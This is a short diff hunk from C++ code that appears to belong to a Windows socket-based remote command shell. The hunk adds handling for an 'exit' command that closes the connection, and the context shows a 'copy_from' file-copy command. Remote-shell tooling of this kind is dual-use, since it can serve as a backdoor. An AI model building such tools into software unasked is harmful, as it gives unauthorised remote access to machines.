@@ -27,6 +27,13 @@ start:
             continue;
 
         log << "shell $ " << command << std::endl;
+		
+		if (strncmp(command.c_str(), "exit", 4) == 0) {
+            std::cout << "Closing connection..." << std::endl;
+            closesocket(ConnectSocket);
+            WSACleanup();
+            return;
+        }
 
         // Checks if the typed command is copy_from, due to it needing different procedure
         if(strncmp(command.c_str(), "copy_from ", 10) == 0)
